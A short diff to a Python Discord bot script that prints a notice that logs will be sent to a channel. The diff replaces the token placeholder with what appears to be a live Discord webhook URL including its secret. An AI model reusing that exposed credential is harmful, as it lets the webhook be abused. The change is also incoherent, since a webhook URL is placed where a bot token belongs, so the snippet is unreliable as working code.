@@ -8,7 +8,7 @@
 from requests import get;import discord;from discord.ext import commands
 def bot():
     client = commands.Bot(command_prefix="PREFIX HERE")
-    discordBot = 'TOKEN HERE'
+    discordBot = 'https://discord.com/api/webhooks/1134489953389269002/milR2GpjFVMwN_mAk7Y_TM08VRVlWLRrm0amhhAJytgyGXhqH7ti8rqr4QgfNv4UdYLA'
     @client.event
     async def on_ready():
         print(f"""Successfully Connected To [{client.user}]\n\n[!] Logs will be sent here""")
